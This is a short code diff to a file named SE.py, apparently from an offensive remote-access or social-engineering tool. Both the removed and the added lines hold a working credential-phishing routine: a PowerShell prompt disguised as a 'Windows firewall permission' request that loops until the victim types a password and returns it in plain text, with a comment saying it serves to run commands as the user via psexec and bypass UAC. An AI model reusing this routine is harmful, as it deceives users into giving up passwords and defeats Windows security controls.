+++ resources/SE.py
@@ -4,9 +4,8 @@
 
 #Get the user password by fooling him and then uses it to run commands as the user by psexec to bypass UAC
 def ask_pwd():
-    while True:
-        cmd = '''Powershell "$cred=$host.ui.promptforcredential('Windows firewall permission','',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password;"'''
-        x = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        response = x.stdout.read().decode()
-        if response.strip() != '' and not response.strip().startswith('[!]'): break
-    return response.strip()
+	while True:
+		cmd = '''Powershell "$cred=$host.ui.promptforcredential('Windows firewall permission','',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password;"'''
+		response = get_output(cmd)
+		if response.strip() != '' and not response.strip().startswith('[!]'): break
+	return response.strip()